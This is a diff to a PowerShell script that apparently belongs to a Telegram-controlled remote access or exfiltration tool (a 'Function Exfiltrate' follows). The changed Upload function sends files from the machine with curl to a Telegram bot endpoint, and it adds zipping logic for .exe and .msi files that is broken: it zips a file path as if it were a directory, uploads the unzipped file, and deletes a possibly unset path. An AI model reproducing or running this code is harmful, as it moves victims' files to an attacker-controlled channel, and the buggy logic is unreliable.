@@ -124,8 +124,20 @@ exit
 
 Function Upload{
 param ([string[]]$Path)
-curl.exe -F chat_id="$ChatID" -F document=@"$Path" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
-Write-Output "File Upload Complete."
+    if (Test-Path -Path $path){
+        $extension = [System.IO.Path]::GetExtension($path)
+        if ($extension -eq ".exe" -or $extension -eq ".msi") {
+            $zipFilePath = "$env:temp\z.zip"
+            Add-Type -AssemblyName System.IO.Compression.FileSystem
+            [System.IO.Compression.ZipFile]::CreateFromDirectory($path, $zipFilePath)
+            }
+        curl.exe -F chat_id="$ChatID" -F document=@"$Path" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
+        Write-Output "File Upload Complete."
+        rm -Path $zipFilePath
+        }
+    else{
+    Write-Output "File not found: $path"
+    }
 }
 
 Function Exfiltrate {
